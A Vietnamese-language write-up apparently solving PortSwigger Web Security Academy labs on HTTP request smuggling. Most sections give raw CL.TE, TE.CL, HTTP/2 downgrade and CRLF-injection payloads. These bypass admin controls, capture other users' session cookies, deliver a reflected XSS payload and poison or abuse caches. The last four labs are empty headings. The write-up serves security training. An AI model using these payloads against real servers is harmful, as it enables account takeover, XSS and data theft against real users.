# Nguyễn Văn Thọ - HTTP Request Smuggling


### Bài 1: HTTP request smuggling, basic CL.TE vulnerability

>![](https://i.imgur.com/JDGPjWa.png)

Để solve bài lab, khiến request method tới phía backend là GPOST

Theo đề, front-end sử dụng `Content-Length` header để xác định độ dài request, back-end thì sử dụng `Transfer-Encoding`. Front-end không support `chunked` encoding và từ chối các request khác GET và POST.

Để tạo request `GPOST` ở phía backend, ta cần đưa vào một request POST và smuggle chữ `G`, sau đó đưa thêm 1 request POST, khi server xác định độ dài các gói HTTP bị sai thì chữ `G` sẽ kết hợp với POST method tiếp theo tạo thành `GPOST` method

Payload:

```
POST / HTTP/1.1
Host: 0a38008b04244bb0c049405700b30046.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked

0\r\n
\r\n
G
```

Với `Content-Length: 5` ta đánh lừa front-end server rằng payload 5 bytes, chữ `G` sẽ thuộc request tiếp theo, vào do đó khai thác thành công.

>![](https://i.imgur.com/yUkws9k.png)

<hr>

### Bài 2: HTTP request smuggling, basic TE.CL vulnerability

>![](https://i.imgur.com/hxvR9ET.png)

Back-end không support chunked encoding, front-end reject các method khác GET với POST.

Để smuggle được 1 `GPOST` request, ta tạo payload có GPOST request (*như bên dưới*), nhưng `Content-Length` chỉ bằng 4, phía backend sẽ coi payload gồm 4 ký tự đầu, `GPOST` phía sau sẽ được backend sử lý như một gói tin tiếp theo vô tình khiến payload trở thành 1 GPOST request

Payload:

```
POST / HTTP/1.1
Host: 0a5a00fe0326fdcbc148679b006900c2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Kết quả:

>![](https://i.imgur.com/1mL8Qry.png)

<hr>

### Bài 3: HTTP request smuggling, obfuscating the TE header

>![](https://i.imgur.com/yWtd6SF.png)

Theo đề, ta cần obfuscate TE header để khiến 1 server phân tách sai request

Để smuggle ***GPOST*** request tới backend, ta obfuscate TE header, khiến 1 trong 2 server không xử lý thông qua TE mà dùng CL header.

Do đó dẫn tới cách xử lý payload ở 2 server khác nhau -> gây ra lỗi

```
POST / HTTP/1.1
Host: 0ac700a504d3be8dc29faddd00b80079.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Kết quả:

>![](https://i.imgur.com/zRlDxzM.png)

<hr>

### Bài 4: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

>![](https://i.imgur.com/4WSUHJj.png)

Ở bài này, FE sửa dụng CL header để xác định độ dài payload, còn BE sử dụng cả 2.

Ta có thể thấy ở đây có sự bất đồng bộ trong xử lý, để trigger được `404` error, ta cần tạo 1 payload pass FE, nhưng khiến BE xử lý lỗi do ghi thêm data ngoài chunk

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

>Phía BE sẽ nhận request thứ 2 như sau
>GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
>
>q=smuggling

**Kết quả:**

>![](https://i.imgur.com/JBnHdtg.png)

<hr>

### Bài 5: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

>![](https://i.imgur.com/fCAkbxN.png)

Cũng tương tự bài trên nhưng bài này phía backend không support TE. Vì nó không support TE nên trường CL ta sẽ giả thành 1 số bé hơn, để phần còn lại của payload được coi như 1 http request tiếp theo.

Payload:

```
POST / HTTP/1.1
Host: 0a900097036bfc1fc025542500a40075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: 0a900097036bfc1fc025542500a40075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

Kết quả:

>![](https://i.imgur.com/1sWsBm0.png)


<hr>

### Bài 6: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

>![](https://i.imgur.com/opeO6sH.png)

Cũng như bài lab trên, thay vì `/404` để detect có thể tấn công, bây giờ ta sẽ GET đường dẫn `/admin/delete?username=carlos`

Biết rằng FE sử dụng CL header, còn BE sử dụng TE, ta tìm cách ghi ngoài chunk 1 GET data để nó được coi như 1 như 1 request ở lần yêu cầu tiếp theo

Payload:

```
POST / HTTP/1.1
Host: 0a9b00960398cf27c16ef3e200d100f1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 159
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
```

**Kết quả:**

>![](https://i.imgur.com/uWSvJq1.png)


<hr>

### Bài 7: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

>![](https://i.imgur.com/b4zAN8U.png)

Chỉ là ngược lại của bài trên.

Payload:

```
POST / HTTP/1.1
Host: 0a1c004904ac3134c334103f00120015.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

8a
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

Foo=x
0


```

Kết quả:

>![](https://i.imgur.com/ea6LFLG.png)


<hr>

### Bài 8: Exploiting HTTP request smuggling to reveal front-end request rewriting

>![](https://i.imgur.com/aEbaVhF.png)

```!
In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers
```

Thử smuggling như các bài trước, ta thấy khi truy cập trang `/admin` sẽ có thông báo như vậy, ta cần xác định xem front-end server đã rewrite request với trường nào để backend xác định IP người dùng.

>![](https://i.imgur.com/DHFZeug.png)

Để ý ta thấy khi post tới `/` (với tham số `search`) nó sẽ reflect data mà ta search về 

>![](https://i.imgur.com/R57hd5i.png)

Vậy nếu ta smuggle 1 `POST /` (với tham số `search`) thì khi concat với request tiếp theo, nó sẽ coi phần data mà front-end đưa tới như là tham số, khi đó sẽ trả về lại cho ta dữ liệu mà phía backend nhận (cũng là dữ liệu đã được rewrite bởi FE)

>![](https://i.imgur.com/YV8TYNN.png)

Ở đây ta thấy backend server đã reflect lại request nhận từ front-end, trong đó có trường `X-nsdSWs-Ip` được FE rewrite chỉ địa chỉ IP của ta, vậy cần phải thêm trường này vào smuggling request để fake IP

Payload:

```
POST / HTTP/1.1
Host: 0af5002a04a39b71c0d6311b002500ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 184
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
X-nsdSWs-Ip: 127.0.0.1
Content-Length: 200
Connection: close

x=1
```

Kết quả:

>![](https://i.imgur.com/mRufkKp.png)


<hr>

### Bài 9: Exploiting HTTP request smuggling to capture other users' requests

>![](https://i.imgur.com/kOYJn5T.png)

Mục tiêu của bài này là smuggle một request với `content-length` có giá trị lớn, để request tiếp theo của người dùng khác bị nối vào, tạo thành một `POST` request với data là `GET` request của nạn nhân, trong đó có chứa session cookie. Thông qua đó ta có thể truy cập vào tài khoản của nạn nhân được.

```!
POST / HTTP/1.1
Host: 0ada0011039edb30c0d0c7aa00af008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 999
Cookie: session=NFbWbwiiy9b2BtNuaf2RQ75nBD3gYwpz

csrf=aZNhsK6irGZHgzOcLHxrYG4H4yQlAOx7&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=
```

Như payload phía trên, phần `content-length` của smuggling request có giá trị 999 bytes, tuy nhiên ta chỉ cung cấp 119 bytes, còn 880 bytes còn lại nó sẽ đợi từ request tiếp theo của nạn nhân và nối vào, từ đó tạo được 1 post comment request, ta có thể đọc comment để lấy thông tin nạn nhân

Kết quả:

>![](https://i.imgur.com/FwavFp1.png)

>![](https://i.imgur.com/KoGMxho.png)

<hr>

### Bài 10: Exploiting HTTP request smuggling to deliver reflected XSS

>![](https://i.imgur.com/21vexTy.png)

Thực hiện tấn công CL.TE - ứng dụng bị reflected XSS trong trường user-agent

Kiểm tra ta thấy trang web bị XSS trong chức năng comment, tuy nhiên thay vì gửi URL đến nạn nhân thì ta sử dụng smuggling attack.

Kiểm tra 1 bài post bất kì, theo dõi form comment, ta thấy `User-Agent` được reflect lại như sau:

>![](https://i.imgur.com/i0H9HCJ.png)

Chỉnh giá trị của trường này ta có thể thực thi XSS.

>![](https://i.imgur.com/B1DLEzy.png)

Không tạo được url, ta thực hiện smuggle 1 GET request với `User-Agent="><script>alert(1)</script>`, khi người dùng khác truy cập, request của họ sẽ được nối vào request GET độc hại của ta hiện tại và server sẽ trả về payload thực thi XSS trên trình duyệt nạn nhân = > ta có thể lấy được cookie.

Payload:

```
POST / HTTP/1.1
Host: 0a8300af03456f2dc091952300bd002c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

>![](https://i.imgur.com/9DpTJZo.png)


<hr>

### Bài 11: Response queue poisoning via H2.TE request smuggling

>![](https://i.imgur.com/XNYp5ta.png)

Ở bài này, lỗ hổng xuất hiện trong quá trình front-end server downgrade HTTP/2 xuống HTTP/1.1 khi giao tiếp với backend server.

Default, client và server sẽ giao tiếp thông qua http/1.1

>![](https://i.imgur.com/IcL2AZj.png)

Thử tìm cách override và buộc giao tiếp qua http/2, kết quả là vẫn giao tiếp với front end với giao thức http/2 được

>![](https://i.imgur.com/OfdE6wd.png)

Kiểm tra xem có lỗ hổng trong việc downgrade HTTP/2 xuống http/1.1 hay không, ta thử tiêm thêm header TE và thực hiện detect, thấy rằng khi thêm trailing payload có thể gây ra lỗi (do request http tiếp theo sẽ trở thành `x=1POST`

>![](https://i.imgur.com/o6bXD6G.png)

Ta thực hiện request hợp lệ tới server, việc backend nhận được 2 request nó sẽ trả về 2 response, tuy nhiên chỉ có 1 giao tiếp HTTP đang thực hiện, nên response thứ 2 sẽ được đặt trong queue và trả về đối với request tiếp theo, mặt dù không biết request đó đến từ 2 -> phản hồi không đồng bộ. 

>When you smuggle a complete request, the front-end server still thinks it only forwarded a single request. On the other hand, the back-end sees two distinct requests, and will send two responses accordingly:

Dựa vào đó ta có thể lấy session của admin (thông qua việc server trả response không đồng bộ vs request, ta nhận được response của admin).

```http!
POST / HTTP/2
Host: 0a2f000f03b8c657c096813f0093006b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Transfer-Encoding: chunked

9
user=test
0

GET / HTTP/1.1
Host: 0a2f000f03b8c657c096813f0093006b.web-security-academy.net
```

>![](https://i.imgur.com/EMqWfNZ.png)


>![](https://i.imgur.com/Y8MbTUT.png)

>![](https://i.imgur.com/xKoZtIB.png)

https://sc.scomurr.com/http-request-smuggling-http-2-downgrade-attack/

<hr>

### Bài 12: H2.CL request smuggling

>![](https://i.imgur.com/c1fgYot.png)


Bài lab bị lỗi http smuggling do quá trình downgrade http2 xuống http1.1 không validate trường `content-length` trong header khiến backend server xử lý sai. Cụ thể, nếu content-length trong request ta chỉ định là 0 thì phần ta chèn thêm bị xử lý như 1 request tiếp theo đó. Nếu phần `chèn thêm` đó là 1 request hợp lệ như payload dưới đây, thì backend sẽ xử lý và trả về response tương ứng. (xếp trong queue)

Khi nạn nhân request trang chủ, sẽ có gửi 1 request tới `/resources` để lấy tài nguyên. Nếu việc trả về bị `desync` thì sẽ vô tình trả về 1 tài nguyên độc hại trong request mà ta đã smuggle. -> server trả về mã thực thi và nó thực hiện trên trình duyệt nạn nhân.


```http!
POST / HTTP/2
Host: 0a730045036e972fc0b30e4300410001.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aa8009103a8979ac00d0db00149006b.exploit-server.net
Content-Length: 5

x=1
```

Kết quả:

>![](https://i.imgur.com/rdP6C27.png)


<hr>

### Bài 13: HTTP/2 request smuggling via CRLF injection

>![](https://i.imgur.com/iSUzUWk.png)

Trong các bài lab trước, ta đã tìm hiểu qua các kĩ thuật smuggling bằng cách nhét thêm vào phần `body` của request gửi tới front-end. Ở bài lab này, ta sẽ sử dụng kĩ thuật để smuggle request trong phần `header`.

>Trong một số ngữ cảnh khi mà header `Content-Length` bị validate, ta cần sử dụng kĩ thuật này để smuggle


Thử chức năng tìm kiếm ta thấy nó lưu lại `Most recent searches`

>![](https://i.imgur.com/iRnu0HA.png)

Tiêm thêm header 
```http!
foo: bar\r\nTransfer-Encoding: chunked
```

Và thêm payload vào request `search` ở trên, ta thử 

```
0

Smuggled
```

Kết quả sau 2 lần request ta thấy kết quả trả về 404, tức có thể smuggle thành công.

Sửa lại ta thay smuggled data bằng 1 request hoàn chỉnh ta có

```
0

POST / HTTP/1.1
Host: 0a7c007e0486222ec3efa323002500c6.web-security-academy.net
Cookie: session=xsPYgUWRcx95qxlZzsce3r5sw4RoGNPt
Content-Length: 860

search=x
```

Khi server downgrade HTTP/2 xuống HTTP/1.1, nó không kiểm tra header, chỉ override lại `content-length` dẫn tới ta có thể cố tình đẩy 1 header nguy hiểm tới backend -> dẫn tới smuggle được request POST trên.

Request tiếp theo đó của nạn nhân sẽ ghép vào giá trị của tham số `search` và post. Ta có thể refresh lại homepage để xem request của nạn nhân, và lấy session

>![](https://i.imgur.com/l5seSdb.png)

Kết quả:

>![](https://i.imgur.com/8iLC6k1.png)


<hr>

### Bài 14: HTTP/2 request splitting via CRLF injection

>![](https://i.imgur.com/jA66zK4.png)

Bài này, các header về độ dài body được validate kĩ càng, tuy nhiên việc split các header trong request khiến lỗ hổng xảy ra.

Front-end trong quá trình rewrite HTTP/2 thành HTTP/1.1 sẽ viết cái http request của ta thành 2 request khác nhau (tách bởi /r/n/r/n)

```
foo: bar

    GET /x HTTP/1.1
    Host: 0ab2003a04ba4f44c1d18a3200a9008a.web-security-academy.net
```

>![](https://i.imgur.com/oV1SzJG.png)


<hr>

### Bài 15: CL.0 request smuggling

>![](https://i.imgur.com/3fwrHeX.png)

Bài lab này khai thác lỗ hổng khi mà backend server "cho rằng" request nhận được sẽ chỉ có dạng GET (không có body) => nó luôn mặc định content-length = 0. Trong khi đó front end server sử dụng `content-length` header để phân tách request 

=> nếu ta khai báo 1 `content-length` nhỏ hơn giá trị độ dài của request thật, front-end sẽ xử lý như là 2 request đẩy tới backend. Trong khi đó, backend vì cứ coi như request không có body nên nó sẽ phân tách các request bởi `/r/n/r/n`

Như payload dưới đây ta gửi đến, front-end sẽ nhận 2 request, thấy rằng không có request `/admin` nên không block, tuy nhiên backend coi như 3 request, nên trả về responses của cả 3 requests (1 sẽ nằm trên queue, 2 trả về cho client)

```http!
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: 0a4f00bc04fff9c2c04fbde500db0047.web-security-academy.net
Content-Length: 109

GET /admin/delete?username=carlos HTTP/1.1
Host: 0a4f00bc04fff9c2c04fbde500db0047.web-security-academy.net

GET /x HTTP/1.1
Host: 0a4f00bc04fff9c2c04fbde500db0047.web-security-academy.net

```


Kết quả:

>![](https://i.imgur.com/mywLZqy.png)


>![](https://i.imgur.com/yDIdK09.png)

<hr>

### Bài 16: Exploiting HTTP request smuggling to perform web cache poisoning

>![](https://i.imgur.com/ekbI1oG.png)

Kiểm tra ta thấy có 2 request được cache lại là `/resources/js/tracking.js` và `/resources/images/blog.svg`

Nếu ta smuggle 1 request `/post/next?postId=<x>` thì các request sau đó tới `/resources/js/tracking.js` sẽ nhận được respone của cái request mà ta smuggle (desync).

=> vô tình lấy data từ smuggled request và đẩy vào cache, dẫn tới payload được nằm trong cache -> các user khác đều bị XSS.

```http!
POST / HTTP/1.1
Host: 0a9c002304d87a90c4cfc91e00a400ff.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a3e002704a07a7bc45cc844015f00b2.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

>![](https://i.imgur.com/Pbu8tog.png)


>![](https://i.imgur.com/Y0MaK4h.png)


>![](https://i.imgur.com/PsFioRB.png)

<hr>

### Bài 17: Exploiting HTTP request smuggling to perform web cache deception

>![](https://i.imgur.com/IujwZXx.png)

>![](https://i.imgur.com/mzLb4wn.png)


Mục tiêu bài này cũng giống web cache poisoning phía trên, tuy nhiên ta khiến server cache lại response cho user khác, sau đó ta có thể lấy thông tin nhạy cảm (ở đây là API key)

Vì đề miêu tả rằng front-end server sử dụng CL header, nên ta sử dụng payload như sau để smuggle 1 request đến trang `/my-account` (nơi có api key)

```http!
POST / HTTP/1.1
Host: 0a3300c1037c78a6c1b685160017008b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

Request đến tài nguyên (ví dụ `/resources/js/tracking.js`) sẽ được cache, do đó, khi victim gửi request đến tài nguyên trên, server lại trả về kết quả của `/my-account` và lưu vào cache, khi ta truy cập `/resources/js/tracking.js` sẽ nhận được bản cache của victim -> lấy được thông tin nhạy cảm.

>![](https://i.imgur.com/SDBXB6T.png)


>![](https://i.imgur.com/gRvRgiA.png)


<hr>

### Bài 18: Bypassing access controls via HTTP/2 request tunnelling

>![](https://i.imgur.com/GebnVlS.png)

Trang web có chức năng `search` thực hiện gửi request bằng method GET để tìm kiếm thông tin. Tuy nhiên khi ta convert sang POST vẫn thực hiện được.

>![](https://i.imgur.com/i17Rw64.png)

Thử CRLF một header ví dụ:

```http!
foo: bar\r\n
Host: abc
```

Ta thấy kết quả như sau -> có thể inject thêm header vào.

>![](https://i.imgur.com/jHYlex3.png)

Theo đề front-end server có rewrite lại request và thêm 1 số header vào, ta cần smuggle request để biết các header đó là gì. Nhận thấy không thể smuggle trong body của request, ta smuggle trong header

```http!
foo: bar\r\n
Content-Length: 500\r\n
\r\n

search=test
```

Ở payload trên, ta viết lại request với value của `search` là `test: x` cộng với phần header mà front-end server rewrite thêm vào. `Content-Length` với giá trị lớn cho phép ta lấy được toàn bộ các header tiếp theo đó, như hình sau:

>![](https://i.imgur.com/tH3bOF7.png)

Sửa lại các header và sửa lại payload để smuggle 1 request ta có như sau:

```http!
foo: bar\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: 4520338559009280\r\n
\r\n
```
 
>![](https://i.imgur.com/seBaqgW.png)

<hr>

### Bài 19: Web cache poisoning via HTTP/2 request tunnelling

<hr>

### Bài 20: Client-side desync

<hr>

### Bài 21: Browser cache poisoning via client-side desync

<hr>

### Bài 22: Server-side pause-based request smuggling

<hr>

